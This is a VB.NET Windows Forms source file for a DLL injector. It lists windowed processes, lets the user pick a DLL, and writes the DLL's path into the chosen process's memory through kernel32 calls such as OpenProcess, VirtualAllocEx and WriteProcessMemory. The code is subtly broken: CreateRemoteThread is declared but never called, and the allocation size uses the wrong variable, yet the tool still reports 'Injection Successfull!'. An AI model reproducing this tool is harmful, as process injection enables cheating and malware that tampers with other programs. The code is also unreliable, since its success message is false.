Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Net.Http.Headers
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading.Tasks
Imports System.Windows.Forms

Namespace AuroraServer
    Partial Public Class Form1
        Inherits Form

        Public Sub New()
            InitializeComponent()
            Dim PC As Process() = Process.GetProcesses().Where(Function(p) CLng(p.MainWindowHandle) <> 0).ToArray()
            comboBox1.Items.Clear()

            For Each p As Process In PC
                comboBox1.Items.Add(p.ProcessName)
            Next
        End Sub

        Private Sub Form1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs)
            Me.Capture = False
            Dim msg = Message.Create(Me.Handle, &HA1, New IntPtr(2), IntPtr.Zero)
            Me.WndProc(msg)
        End Sub

        Private Sub pictureBox1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Application.[Exit]()
        End Sub

        Private Shared Property DLLP As String

        Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try
                Dim OFD As OpenFileDialog = New OpenFileDialog()
                OFD.InitialDirectory = "C:\"
                OFD.Title = "Locate DLL File for Injection"
                OFD.DefaultExt = "dll"
                OFD.Filter = "DLL Files (*.dll)|*.dll"
                OFD.CheckFileExists = True
                OFD.CheckPathExists = True
                OFD.ShowDialog()
                textBox1.Text = OFD.FileName
                DLLP = OFD.FileName
            Catch
                MessageBox.Show("Error")
            End Try
        End Sub

        Private Sub textBox1_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            DLLP = textBox1.Text
        End Sub

        Private Sub button4_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim PC As Process() = Process.GetProcesses().Where(Function(p) CLng(p.MainWindowHandle) <> 0).ToArray()
            comboBox1.Items.Clear()

            For Each p As Process In PC
                comboBox1.Items.Add(p.ProcessName)
            Next
        End Sub

        Shared ReadOnly INTPTR_ZERO As IntPtr = CType(0, IntPtr)
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function OpenProcess(ByVal dwDesiredAccess As UInteger, ByVal bInheritHandle As Integer, ByVal dwProcessId As UInteger) As IntPtr

        End Function
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function CloseHandle(ByVal hObject As IntPtr) As Integer

        End Function
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function GetProcAddress(ByVal hModule As IntPtr, ByVal lpProcName As String) As IntPtr

        End Function
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr

        End Function
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function VirtualAllocEx(ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, ByVal dwSize As IntPtr, ByVal flAllocationType As UInteger, ByVal flProtect As UInteger) As IntPtr

        End Function
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function WriteProcessMemory(ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, ByVal buffer As Byte(), ByVal size As UInteger, ByVal lpNumberOfBytesWritten As Integer) As Integer

        End Function
        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function CreateRemoteThread(ByVal hProcess As IntPtr, ByVal lpThreadAttribute As IntPtr, ByVal dwStackSize As IntPtr, ByVal lpStartAddress As IntPtr, ByVal lpParameter As IntPtr, ByVal dwCreatationFlags As UInteger, ByVal lpThreadId As IntPtr) As IntPtr

        End Function

        Public Shared Function Inject(ByVal PN As String, ByVal DLLP As String) As Integer
            If Not File.Exists(DLLP) Then
                Return 1
            End If

            Dim _procId As UInteger = 0
            Dim _procs As Process() = Process.GetProcesses()

            For i As Integer = 0 To _procs.Length - 1

                If _procs(i).ProcessName = PN Then
                    _procId = CUInt(_procs(i).Id)
                End If
            Next

            If _procId = 0 Then
                Return 2
            End If

            If Not SI(_procId, DLLP) Then
                Return 3
            End If

            Return 4
        End Function

        Public Shared Function SI(ByVal P As UInteger, ByVal DDLP As String) As Boolean
            Dim hndProc As IntPtr = OpenProcess((&H2 Or &H8 Or &H10 Or &H20 Or &H400), 1, P)

            If hndProc = INTPTR_ZERO Then
                Return False
            End If

            Dim lpAddress As IntPtr = VirtualAllocEx(hndProc, CType(Nothing, IntPtr), CType(DLLP.Length, IntPtr), (&H1000 Or &H2000), &H40)

            If lpAddress = INTPTR_ZERO Then
                Return False
            End If

            Dim bytes As Byte() = Encoding.ASCII.GetBytes(DLLP)

            If WriteProcessMemory(hndProc, lpAddress, bytes, CUInt(bytes.Length), 0) = 0 Then
                Return False
            End If

            CloseHandle(hndProc)
            Return True
        End Function

        Private Sub button3_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim Result As Integer = Inject(comboBox1.Text, DLLP)

            If Result = 1 Then
                MessageBox.Show("File does not exists!")
            ElseIf Result = 2 Then
                MessageBox.Show("Process Does not Exists!")
            ElseIf Result = 3 Then
                MessageBox.Show("Injection Fails!")
            ElseIf Result = 4 Then
                MessageBox.Show("Injection Successfull!")
            End If
        End Sub

        Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim formAbout As about = New about()
            formAbout.Show()
        End Sub
    End Class
End Namespace
